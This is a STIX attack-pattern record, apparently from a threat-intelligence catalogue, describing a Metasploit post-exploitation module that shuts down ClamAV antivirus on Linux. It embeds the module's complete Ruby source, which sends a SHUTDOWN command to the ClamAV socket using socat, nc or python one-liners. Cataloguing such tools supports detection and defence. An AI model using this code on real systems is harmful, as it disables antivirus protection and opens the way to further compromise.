{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ff0a6208-3341-487f-bed1-aa6443b621b6",
    "created": "2024-08-14T16:33:13.577805Z",
    "modified": "2024-08-14T16:33:13.577808Z",
    "name": "Disable ClamAV",
    "description": " This module will write to the ClamAV Unix socket to shutoff ClamAV.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/manage/disable_clamav.rb",
            "external_id": "disable_clamav.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  Rank = ExcellentRanking\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Disable ClamAV',\n        'Description' => %q{\n          This module will write to the ClamAV Unix socket to shutoff ClamAV.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'DLL_Cool_J'\n        ],\n        'Platform' => [ 'linux' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Notes' => {\n          'Stability' => [SERVICE_RESOURCE_LOSS],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('CLAMAV_UNIX_SOCKET', [true, 'ClamAV unix socket', '/run/clamav/clamd.ctl' ]),\n        OptString.new('COMMAND', [true, 'ClamAV command to execute', 'SHUTDOWN' ])\n      ], self.class\n    )\n  end\n\n  def run\n    clamav_socket = datastore['CLAMAV_UNIX_SOCKET']\n    cmd = datastore['COMMAND']\n\n    if command_exists?('socat')\n      print_good('socat exists')\n      payload = \"echo #{cmd} | socat - UNIX-CONNECT:#{clamav_socket}\"\n    elsif command_exists?('nc')\n      print_good('nc exists')\n      payload = \"echo #{cmd} | nc -U #{clamav_socket}\"\n    elsif command_exists?('python')\n      print_good('python exists')\n      payload = \"python -c \\\"import socket; sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); sock.connect('#{clamav_socket}'); sock.send('#{cmd}'.encode());\\\"\"\n    elsif command_exists?('python3')\n      print_good('python3 exists')\n      payload = \"python3 -c \\\"import socket; sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); sock.connect('#{clamav_socket}'); sock.send('#{cmd}'.encode());\\\"\"\n    else\n      fail_with(Failure::NotFound, 'No suitable binary found on the target host. Quitting!')\n    end\n\n    print_status(\"Checking file path #{clamav_socket} exists and is writable... \")\n    print_bad('File does NOT exist or is not writable!') unless writable?(clamav_socket.to_s)\n    print_good('File does exist and is writable!')\n    print_good(\"Sending #{cmd}...\")\n    cmd_exec(payload)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}